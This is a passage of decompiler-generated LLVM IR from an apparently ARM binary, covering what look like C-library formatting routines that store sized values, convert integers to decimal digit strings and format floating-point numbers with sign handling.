dec_label_pc_18718:                               ; preds = %dec_label_pc_18708
  %v7_18718 = icmp eq i32 %v0_186f4, 512
  br i1 %v7_18718, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_18718
  %v4_18720 = urem i32 %v2_18710.v2_1870c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_18718, %dec_label_pc_18708, %bb
  %v1_18728 = phi i32 [ %v2_1870c, %dec_label_pc_18718 ], [ %v2_18710, %dec_label_pc_18708 ], [ %v4_18720, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_18728

dec_label_pc_1872c:                               ; preds = %dec_label_pc_186f0
  br i1 %v2_1872c, label %dec_label_pc_1873c, label %dec_label_pc_18734

dec_label_pc_18734:                               ; preds = %dec_label_pc_18700, %dec_label_pc_1872c
  %v0_18734 = load i32, i32* @r1, align 4
  %v1_18734 = inttoptr i32 %v0_18734 to i32*
  %v2_18734 = load i32, i32* %v1_18734, align 4
  %v3_18734 = add i32 %v0_18734, 4
  %v4_18734 = inttoptr i32 %v3_18734 to i32*
  %v5_18734 = load i32, i32* %v4_18734, align 4
  store i32 %v5_18734, i32* @r1, align 4
  ret i32 %v2_18734

dec_label_pc_1873c:                               ; preds = %dec_label_pc_1872c
  %v7_1873c = icmp eq i32 %v0_186f4, 256
  %v0_18740 = load i32, i32* @r1, align 4
  %v1_18740 = inttoptr i32 %v0_18740 to i32*
  %v2_18740 = load i32, i32* %v1_18740, align 4
  %v2_18744 = urem i32 %v2_18740, 256
  %v2_18744.v2_18740 = select i1 %v7_1873c, i32 %v2_18744, i32 %v2_18740
  br i1 %v7_1873c, label %.thread2, label %dec_label_pc_1874c

dec_label_pc_1874c:                               ; preds = %dec_label_pc_1873c
  %v7_1874c = icmp eq i32 %v0_186f4, 512
  br i1 %v7_1874c, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_1874c
  %v4_18750 = mul i32 %v2_18744.v2_18740, 65536
  %v4_18754 = sdiv i32 %v4_18750, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1874c, %dec_label_pc_1873c, %bb5
  %v0_18758 = phi i32 [ %v2_18740, %dec_label_pc_1874c ], [ %v2_18744, %dec_label_pc_1873c ], [ %v4_18754, %bb5 ]
  %v3_18758 = ashr i32 %v0_18758, 31
  store i32 %v3_18758, i32* @r1, align 4
  ret i32 %v0_18758

; uselistorder directives
  uselistorder i32 %v0_18758, { 1, 0 }
  uselistorder i32 %v2_18744, { 1, 0 }
  uselistorder i32 %v2_18740, { 1, 2, 0 }
  uselistorder i32 %v2_18710, { 1, 0 }
  uselistorder i32 %v2_1870c, { 1, 2, 0 }
  uselistorder i1 %v2_1872c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_18734, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @function_18760(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_18760:
  %cpsr_z.global-to-local = alloca i1, align 1
  %tmp = trunc i32 %arg3 to i16
  %tmp2 = ptrtoint i16* %arg1 to i32
  %v7_18760 = icmp eq i32 %arg2, 256
  store i1 %v7_18760, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_18760, label %bb, label %bb4

bb:                                               ; preds = %dec_label_pc_18760
  %v3_18764 = trunc i32 %arg3 to i8
  %tmp3 = bitcast i16* %arg1 to i8*
  store i8 %v3_18764, i8* %tmp3, align 1
  %v1_18768.pre = load i1, i1* %cpsr_z.global-to-local, align 1
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_18760, %bb
  %v1_18768 = phi i1 [ false, %dec_label_pc_18760 ], [ %v1_18768.pre, %bb ]
  %v0_18768 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v1_18768, i32 %v0_18768)
  %v7_1876c = icmp eq i32 %arg2, 2048
  store i1 %v7_1876c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1876c, label %dec_label_pc_18774, label %dec_label_pc_1877c

dec_label_pc_18774:                               ; preds = %bb4
  %tmp5 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp5, align 4
  %v5_18774 = add i32 %tmp2, 4
  %v6_18774 = inttoptr i32 %v5_18774 to i32*
  store i32 %arg4, i32* %v6_18774, align 4
  ret i32 %tmp2

dec_label_pc_1877c:                               ; preds = %bb4
  %v7_1877c = icmp eq i32 %arg2, 512
  store i1 %v7_1877c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1877c, label %bb6, label %.thread

bb6:                                              ; preds = %dec_label_pc_1877c
  store i16 %tmp, i16* %arg1, align 2
  br label %bb8

.thread:                                          ; preds = %dec_label_pc_1877c
  %tmp7 = bitcast i16* %arg1 to i32*
  store i32 %arg3, i32* %tmp7, align 4
  br label %bb8

bb8:                                              ; preds = %bb6, %.thread
  ret i32 %tmp2

; uselistorder directives
  uselistorder i16* %arg1, { 3, 2, 0, 1, 4 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_1878c(i8* %arg1) local_unnamed_addr {
dec_label_pc_1878c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %tmp19 = call i32 @__decompiler_undefined_function_0()
  %v3_1878c = load i32, i32* @r4, align 4
  %v12_1878c = load i32, i32* @r7, align 4
  store i32 %tmp19, i32* @r7, align 4
  %v1_18798 = icmp slt i32 %tmp19, 0
  %v2_18798 = icmp eq i32 %tmp19, 0
  store i1 %v2_18798, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  %v0_187a0 = load i32, i32* @r2, align 4
  store i32 %v0_187a0, i32* %r5.global-to-local, align 4
  %v0_187a4 = load i32, i32* @r3, align 4
  store i32 %v0_187a4, i32* %r6.global-to-local, align 4
  br i1 %v1_18798, label %dec_label_pc_187ac, label %dec_label_pc_187cc

dec_label_pc_187ac:                               ; preds = %dec_label_pc_1878c
  %v1_187ac = icmp slt i32 %v0_187a4, 0
  %v2_187ac = icmp eq i32 %v0_187a4, 0
  store i1 %v2_187ac, i1* %cpsr_z.global-to-local, align 1
  %v1_187b0 = sub i32 0, %tmp19
  store i32 %v1_187b0, i32* @r7, align 4
  br i1 %v1_187ac, label %dec_label_pc_187b8, label %dec_label_pc_187cc

dec_label_pc_187b8:                               ; preds = %dec_label_pc_187ac
  %v1_187bc = sub i32 0, %v0_187a0
  store i32 %v1_187bc, i32* %r5.global-to-local, align 4
  %v2_187bc = icmp eq i32 %v0_187a0, 0
  %v2_187c0 = icmp eq i1 %v2_187bc, false
  %v5_187c0 = sext i1 %v2_187c0 to i32
  %v6_187c0 = sub i32 %v5_187c0, %v0_187a4
  store i32 %v6_187c0, i32* %r6.global-to-local, align 4
  %v19_187c0 = icmp eq i32 %v6_187c0, 0
  store i1 %v19_187c0, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_187d4

dec_label_pc_187cc:                               ; preds = %dec_label_pc_187ac, %dec_label_pc_1878c
  br label %dec_label_pc_187d4

dec_label_pc_187d4:                               ; preds = %dec_label_pc_187b8, %dec_label_pc_187cc
  %storemerge = phi i8 [ 0, %dec_label_pc_187cc ], [ 1, %dec_label_pc_187b8 ]
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_187dc = load i32, i32* @r7, align 4
  store i32 %v0_187dc, i32* @r1, align 4
  store i32 -1, i32* @r0, align 4
  %v0_187e4 = call i32 @function_12418()
  %v0_187e8 = load i32, i32* @r7, align 4
  store i32 %v0_187e4, i32* %fp.global-to-local, align 4
  %v2_187f4 = call i32 @function_12514(i32 -1, i32 %v0_187e8)
  %v1_187f8 = add i32 %v0_187e8, 1
  store i32 %v1_187f8, i32* %sb.global-to-local, align 4
  %v1_187fc = load i32, i32* @r7, align 4
  %v9_187fc = icmp eq i32 %v1_187f8, %v1_187fc
  store i1 %v9_187fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_187fc, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_187d4
  %v1_18800 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_18800, i32* %sb.global-to-local, align 4
  %v1_18804 = load i32, i32* %fp.global-to-local, align 4
  %v2_18804 = add i32 %v1_18804, 1
  store i32 %v2_18804, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_187d4, %bb
  %v0_18808 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_18808, i32* %sl.global-to-local, align 4
  %v0_1880c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1880c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_18810

dec_label_pc_18810thread-pre-split:               ; preds = %bb23
  %v0_18810.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_18814.pre = load i32, i32* %r6.global-to-local, align 4
  %v0_18818.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_18810

dec_label_pc_18810:                               ; preds = %dec_label_pc_18810thread-pre-split, %.thread
  %v0_18818 = phi i32 [ %v0_18818.pre, %dec_label_pc_18810thread-pre-split ], [ %v1_187fc, %.thread ]
  %v0_18814 = phi i32 [ %v0_18814.pre, %dec_label_pc_18810thread-pre-split ], [ %v0_1880c, %.thread ]
  %v0_18820 = phi i32 [ %v0_18810.pr, %dec_label_pc_18810thread-pre-split ], [ %v0_18808, %.thread ]
  %v2_18810 = icmp eq i32 %v0_18820, 0
  store i1 %v2_18810, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18810, label %dec_label_pc_18888, label %dec_label_pc_18820

dec_label_pc_18820:                               ; preds = %dec_label_pc_18810
  %v2_18824 = call i32 @function_12514(i32 %v0_18820, i32 %v0_18818)
  %v0_18828 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v0_18828, i32* @r0, align 4
  store i32 %v0_18818, i32* @r4, align 4
  %v0_18830 = load i32, i32* @r7, align 4
  store i32 %v0_18830, i32* @r1, align 4
  %v0_18834 = call i32 @function_12418()
  %v0_18838 = load i32, i32* @r7, align 4
  store i32 %v0_18834, i32* %sl.global-to-local, align 4
  %v0_18840 = load i32, i32* %r6.global-to-local, align 4
  %v2_18844 = call i32 @function_12514(i32 %v0_18840, i32 %v0_18838)
  %v0_18848 = load i32, i32* %sb.global-to-local, align 4
  %v1_18848 = load i32, i32* @r4, align 4
  %v2_18848 = mul i32 %v1_18848, %v0_18848
  store i32 %v0_18840, i32* @r0, align 4
  %v2_18850 = add i32 %v2_18848, %v0_18838
  store i32 %v2_18850, i32* %r5.global-to-local, align 4
  %v0_18854 = load i32, i32* @r7, align 4
  store i32 %v0_18854, i32* @r1, align 4
  %v0_18858 = call i32 @function_12418()
  %v0_1885c = load i32, i32* %fp.global-to-local, align 4
  %v1_1885c = load i32, i32* @r4, align 4
  %v2_1885c = mul i32 %v1_1885c, %v0_1885c
  %v0_18860 = load i32, i32* @r7, align 4
  store i32 %v0_18860, i32* @r1, align 4
  %v2_18864 = add i32 %v2_1885c, %v0_18858
  store i32 %v2_18864, i32* @r4, align 4
  %v0_18868 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18868, i32* @r0, align 4
  %v0_1886c = call i32 @function_12418()
  %v0_18870 = load i32, i32* @r7, align 4
  %v0_18874 = load i32, i32* @r4, align 4
  %v2_18874 = add i32 %v0_18874, %v0_1886c
  store i32 %v2_18874, i32* %r6.global-to-local, align 4
  %v0_18878 = load i32, i32* %r5.global-to-local, align 4
  %v2_1887c = call i32 @function_12514(i32 %v0_18878, i32 %v0_18870)
  store i32 %v0_18870, i32* @r4, align 4
  br label %dec_label_pc_188a0

dec_label_pc_18888:                               ; preds = %dec_label_pc_18810
  %v2_18888 = call i32 @function_12514(i32 %v0_18814, i32 %v0_18818)
  %v0_1888c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1888c, i32* @r0, align 4
  store i32 %v0_18818, i32* @r4, align 4
  %v0_18894 = load i32, i32* @r7, align 4
  store i32 %v0_18894, i32* @r1, align 4
  %v0_18898 = call i32 @function_12418()
  store i32 %v0_18898, i32* %r6.global-to-local, align 4
  %v0_188a4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_188a0

dec_label_pc_188a0:                               ; preds = %dec_label_pc_18820, %dec_label_pc_18888
  %v0_188a8 = phi i32 [ %v0_18870, %dec_label_pc_18820 ], [ %v0_188a4.pre, %dec_label_pc_18888 ]
  %v2_188a4 = icmp ugt i32 %v0_188a8, 8
  %v7_188a4 = icmp eq i32 %v0_188a8, 9
  store i1 %v7_188a4, i1* %cpsr_z.global-to-local, align 1
  %v1_188ac = add i32 %v0_188a8, 48
  %v0_188b4 = load i32, i32* %r8.global-to-local, align 4
  %v1_188b4 = add i32 %v0_188b4, -1
  store i32 %v1_188b4, i32* %r8.global-to-local, align 4
  %v2_188b8 = xor i1 %v7_188a4, true
  %v3_188b8 = and i1 %v2_188a4, %v2_188b8
  %extract.t = trunc i32 %v1_188ac to i8
  br i1 %v3_188b8, label %bb22, label %bb23

bb22:                                             ; preds = %dec_label_pc_188a0
  %v2_188a8 = add i32 %v0_188a8, %tmp9
  %extract.t7 = trunc i32 %v2_188a8 to i8
  br label %bb23

bb23:                                             ; preds = %dec_label_pc_188a0, %bb22
  %v0_188c0.off0 = phi i8 [ %extract.t, %dec_label_pc_188a0 ], [ %extract.t7, %bb22 ]
  %v0_188bc = load i32, i32* %r6.global-to-local, align 4
  %v1_188bc = load i32, i32* %sl.global-to-local, align 4
  %v2_188bc = or i32 %v1_188bc, %v0_188bc
  %v4_188bc = icmp eq i32 %v2_188bc, 0
  store i1 %v4_188bc, i1* %cpsr_z.global-to-local, align 1
  %v3_188c0 = inttoptr i32 %v1_188b4 to i8*
  store i8 %v0_188c0.off0, i8* %v3_188c0, align 1
  %v0_188c4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_188c4, label %dec_label_pc_188c8, label %dec_label_pc_18810thread-pre-split

dec_label_pc_188c8:                               ; preds = %bb23
  %v4_188c88 = zext i8 %storemerge to i32
  store i32 %v4_188c88, i32* @r3, align 4
  %v2_188cc = icmp eq i8 %storemerge, 0
  store i1 %v2_188cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_188cc, label %dec_label_pc_188c8..thread2_crit_edge, label %bb24

dec_label_pc_188c8..thread2_crit_edge:            ; preds = %dec_label_pc_188c8
  %v0_188d8.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb24:                                             ; preds = %dec_label_pc_188c8
  store i32 45, i32* @r3, align 4
  %v3_188d4 = load i32, i32* %r8.global-to-local, align 4
  %v4_188d4 = add i32 %v3_188d4, -1
  %v5_188d4 = inttoptr i32 %v4_188d4 to i8*
  store i8 45, i8* %v5_188d4, align 1
  %v6_188d4 = load i32, i32* %r8.global-to-local, align 4
  %v7_188d4 = add i32 %v6_188d4, -1
  store i32 %v7_188d4, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_188c8..thread2_crit_edge, %bb24
  %v0_188d8 = phi i32 [ %v0_188d8.pre, %dec_label_pc_188c8..thread2_crit_edge ], [ %v7_188d4, %bb24 ]
  store i32 %v3_1878c, i32* @r4, align 4
  store i32 %v12_1878c, i32* @r7, align 4
  ret i32 %v0_188d8

; uselistorder directives
  uselistorder i32 %v0_18870, { 0, 2, 1 }
  uselistorder i8 %storemerge, { 1, 0 }
  uselistorder i32 %v0_187a0, { 1, 0, 2 }
  uselistorder i32 %tmp19, { 0, 3, 2, 1 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 3, 1, 4, 5, 6 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r6.global-to-local, { 2, 0, 5, 3, 4, 1, 6, 8, 7, 9 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2, 3 }
  uselistorder i8 1, { 3, 4, 0, 22, 23, 21, 20, 18, 19, 17, 15, 16, 14, 11, 12, 13, 8, 9, 6, 7, 1, 2, 10, 5, 24 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb23, { 1, 0 }
  uselistorder label %dec_label_pc_188a0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_187d4, { 1, 0 }
}

define i32 @function_188e8(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_188e8:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_0 = alloca i32, align 4
  %tmp182 = ptrtoint i32* %arg4 to i32
  store i32 %tmp182, i32* %stack_var_0, align 4
  %stack_var_-46 = alloca i8, align 1
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-47 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-82 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-83 = alloca i32, align 4
  %stack_var_-81 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-208 = alloca i32, align 4
  %v3_188e8 = load i32, i32* @r4, align 4
  %v6_188e8 = load i32, i32* @r5, align 4
  %v9_188e8 = load i32, i32* @r6, align 4
  %v12_188e8 = load i32, i32* @r7, align 4
  %v27_188e8 = load i32, i32* @lr, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v1_188f4 = add i32 %tmp182, 8
  %v2_188f4 = inttoptr i32 %v1_188f4 to i8*
  %v3_188f4 = load i8, i8* %v2_188f4, align 1
  %v4_188f4 = zext i8 %v3_188f4 to i32
  store i32 %v4_188f4, i32* %sb.global-to-local, align 4
  %v1_188f8 = or i32 %v4_188f4, 32
  %v7_188fc = icmp eq i32 %v1_188f8, 97
  store i1 %v7_188fc, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp182, i32* %r0.global-to-local, align 4
  store i32 %tmp182, i32* %r1.global-to-local, align 4
  %v2_18914 = load i32, i32* %arg4, align 4
  store i32 %v2_18914, i32* %fp.global-to-local, align 4
  store i32 %tmp182, i32* %lr.global-to-local, align 4
  %v0_1891c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1891c, i32* @r6, align 4
  store i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32* %ip.global-to-local, align 4
  br i1 %v7_188fc, label %bb, label %bb197

bb:                                               ; preds = %dec_label_pc_188e8
  %v2_18924 = add nuw nsw i32 %v4_188f4, 6
  store i32 %v2_18924, i32* %r3.global-to-local, align 4
  br label %bb197

bb197:                                            ; preds = %dec_label_pc_188e8, %bb
  %v1_18934 = phi i32 [ %v0_1891c, %dec_label_pc_188e8 ], [ %v2_18924, %bb ]
  store i32 %arg2, i32* @r5, align 4
  %v1_1892c = add i32 %tmp182, 12
  %v2_1892c = inttoptr i32 %v1_1892c to i32*
  %v3_1892c = load i32, i32* %v2_1892c, align 4
  store i32 %v3_1892c, i32* %r2.global-to-local, align 4
  %v1_18930 = add i32 %tmp182, 4
  %v2_18930 = inttoptr i32 %v1_18930 to i32*
  %v3_18930 = load i32, i32* %v2_18930, align 4
  store i32 %v3_18930, i32* @lr, align 4
  br i1 %v7_188fc, label %bb198, label %bb199

bb198:                                            ; preds = %bb197
  %v2_18934 = urem i32 %v1_18934, 256
  store i32 %v2_18934, i32* %sb.global-to-local, align 4
  br label %bb199

bb199:                                            ; preds = %bb197, %bb198
  %v1_18938 = icmp slt i32 %v2_18914, 0
  %v2_18938 = icmp eq i32 %v2_18914, 0
  store i1 %v2_18938, i1* %cpsr_z.global-to-local, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), i32* %ip.global-to-local, align 4
  br i1 %v1_18938, label %bb200, label %bb201

bb200:                                            ; preds = %bb199
  store i32 6, i32* %fp.global-to-local, align 4
  br label %bb201

bb201:                                            ; preds = %bb199, %bb200
  %v1_18948 = and i32 %v3_1892c, 2
  %v2_18948 = icmp eq i32 %v1_18948, 0
  store i1 %v2_18948, i1* %cpsr_z.global-to-local, align 1
  store i8 0, i8* %stack_var_-46, align 1
  br i1 %v2_18948, label %dec_label_pc_18960, label %dec_label_pc_1896c

dec_label_pc_18960:                               ; preds = %bb201
  %v1_18960 = urem i32 %v3_1892c, 2
  %v2_18960 = icmp eq i32 %v1_18960, 0
  store i1 %v2_18960, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18960, label %dec_label_pc_18970, label %dec_label_pc_1896c

dec_label_pc_1896c:                               ; preds = %dec_label_pc_18960, %bb201
  %storemerge = phi i32 [ 43, %bb201 ], [ 32, %dec_label_pc_18960 ]
  %v0_1896c.off0 = phi i8 [ 43, %bb201 ], [ 32, %dec_label_pc_18960 ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  store i8 %v0_1896c.off0, i8* %stack_var_-46, align 1
  br label %dec_label_pc_18970

dec_label_pc_18970:                               ; preds = %dec_label_pc_18960, %dec_label_pc_1896c
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 %v0_1891c, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r0, align 4
  store i32 %v0_1891c, i32* %r1.global-to-local, align 4
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v5_1898c = call i32 @function_1dd98(i32 %arg2, i32 %v0_1891c, i32 %arg2, i32 %v0_1891c, i32 0)
  store i32 %v5_1898c, i32* %r0.global-to-local, align 4
  %v2_18990 = icmp eq i32 %v5_1898c, 0
  store i1 %v2_18990, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18990, label %bb203, label %dec_label_pc_189a0

bb203:                                            ; preds = %dec_label_pc_18970
  store i32 8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_18a54

dec_label_pc_189a0:                               ; preds = %dec_label_pc_18970
  %v0_189a0 = load i32, i32* @r5, align 4
  store i32 %v0_189a0, i32* @r0, align 4
  %v0_189a4 = load i32, i32* @r6, align 4
  store i32 %v0_189a4, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_189b0 = call i32 @function_1dd98(i32 %v0_189a0, i32 %v0_189a4, i32 0, i32 0, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_189b0, i32* %r0.global-to-local, align 4
  %v2_189b4 = icmp eq i32 %v5_189b0, 0
  store i1 %v2_189b4, i1* %cpsr_z.global-to-local, align 1
  %v0_189fc = load i32, i32* @r5, align 4
  br i1 %v2_189b4, label %dec_label_pc_189fc, label %dec_label_pc_189bc

dec_label_pc_189bc:                               ; preds = %dec_label_pc_189a0
  store i32 %v0_189fc, i32* %r2.global-to-local, align 4
  %v0_189c0 = load i32, i32* @r6, align 4
  store i32 %v0_189c0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 1072693248, i32* %r1.global-to-local, align 4
  %v4_189cc = call i32 @function_1dac4(i32 0, i32 1072693248, i32 %v0_189fc, i32 %v0_189c0)
  store i32 %v4_189cc, i32* @r0, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_189d8 = call i32 @function_1ddb0(i32 %v4_189cc)
  store i32 %v1_189d8, i32* %r0.global-to-local, align 4
  %v2_189dc = icmp eq i32 %v1_189d8, 0
  store i1 %v2_189dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_189dc, label %bb204, label %dec_label_pc_189e8

bb204:                                            ; preds = %dec_label_pc_189bc
  store i32 -1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18bc8

dec_label_pc_189e8:                               ; preds = %dec_label_pc_189bc
  store i32 45, i32* %r3.global-to-local, align 4
  store i8 45, i8* %stack_var_-46, align 1
  br label %dec_label_pc_18bc8

dec_label_pc_189fc:                               ; preds = %dec_label_pc_189a0
  store i32 %v0_189fc, i32* @r0, align 4
  %v0_18a00 = load i32, i32* @r6, align 4
  store i32 %v0_18a00, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_18a0c = call i32 @function_1ddb0(i32 %v0_189fc)
  store i32 %v4_18a0c, i32* %r0.global-to-local, align 4
  %v2_18a10 = icmp eq i32 %v4_18a0c, 0
  store i1 %v2_18a10, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a10, label %dec_label_pc_189fc..thread9_crit_edge, label %bb205

dec_label_pc_189fc..thread9_crit_edge:            ; preds = %dec_label_pc_189fc
  %v0_18a30.pre = load i32, i32* @r6, align 4
  br label %.thread9

bb205:                                            ; preds = %dec_label_pc_189fc
  store i32 45, i32* %r2.global-to-local, align 4
  %v1_18a18 = load i32, i32* @r6, align 4
  %v2_18a18 = sub i32 0, %v1_18a18
  store i32 %v2_18a18, i32* @r4, align 4
  store i8 45, i8* %stack_var_-46, align 1
  store i32 %v2_18a18, i32* @r6, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_189fc..thread9_crit_edge, %bb205
  %v0_18a30 = phi i32 [ %v0_18a30.pre, %dec_label_pc_189fc..thread9_crit_edge ], [ %v2_18a18, %bb205 ]
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 1070596096, i32* %r3.global-to-local, align 4
  %v0_18a2c = load i32, i32* @r5, align 4
  store i32 %v0_18a2c, i32* %r0.global-to-local, align 4
  store i32 %v0_18a30, i32* %r1.global-to-local, align 4
  %v4_18a34 = sext i32 %v0_18a2c to i64
  %v5_18a34 = call i32 @function_1d834(i64 %v4_18a34, i32 %v0_18a30, i32 0, i32 1070596096)
  store i32 %v5_18a34, i32* %r2.global-to-local, align 4
  store i32 %v0_18a30, i32* %r3.global-to-local, align 4
  %v0_18a40 = load i32, i32* @r5, align 4
  store i32 %v0_18a40, i32* @r0, align 4
  %v0_18a44 = load i32, i32* @r6, align 4
  store i32 %v0_18a44, i32* %r1.global-to-local, align 4
  %v5_18a48 = call i32 @function_1dd98(i32 %v0_18a40, i32 %v0_18a44, i32 %v5_18a34, i32 %v0_18a30, i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_18a48, i32* %r0.global-to-local, align 4
  %v2_18a4c = icmp eq i32 %v5_18a48, 0
  store i1 %v2_18a4c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_18a4c, label %dec_label_pc_18aa0, label %.thread9.dec_label_pc_18a54_crit_edge

.thread9.dec_label_pc_18a54_crit_edge:            ; preds = %.thread9
  %v3_18a54.pre = load i32, i32* %stack_var_0, align 4
  br label %dec_label_pc_18a54

dec_label_pc_18a54:                               ; preds = %bb203, %.thread9.dec_label_pc_18a54_crit_edge
  %v3_18a54 = phi i32 [ %v3_18a54.pre, %.thread9.dec_label_pc_18a54_crit_edge ], [ %tmp182, %bb203 ]
  %v1_18998.v0_189845 = phi i32 [ 0, %.thread9.dec_label_pc_18a54_crit_edge ], [ 8, %bb203 ]
  store i32 %v3_18a54, i32* %ip.global-to-local, align 4
  %v2_18a5c = add i32 %v3_18a54, 16
  %v3_18a5c = inttoptr i32 %v2_18a5c to i32*
  store i32 32, i32* %v3_18a5c, align 4
  %v0_18a64 = load i32, i32* %sb.global-to-local, align 4
  %v7_18a64 = icmp eq i32 %v0_18a64, 96
  store i1 %v7_18a64, i1* %cpsr_z.global-to-local, align 1
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 3, i32* %stack_var_-164, align 4
  %tmp = icmp ult i32 %v0_18a64, 97
  br i1 %tmp, label %bb206, label %.thread121

bb206:                                            ; preds = %dec_label_pc_18a54
  %v5_18a78 = or i32 %v1_18998.v0_189845, 4
  store i32 %v5_18a78, i32* %r3.global-to-local, align 4
  br label %.thread121

.thread121:                                       ; preds = %dec_label_pc_18a54, %bb206
  %v4_18a7c = phi i32 [ %v5_18a78, %bb206 ], [ 3, %dec_label_pc_18a54 ]
  %v4_18a7c.v1_18998.v0_18984 = select i1 %tmp, i32 %v4_18a7c, i32 %v1_18998.v0_189845
  store i32 add (i32 ptrtoint (i32* @global_var_136dc.996 to i32), i32 100680), i32* %lr.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_23c60.1000 to i32), i32* %r3.global-to-local, align 4
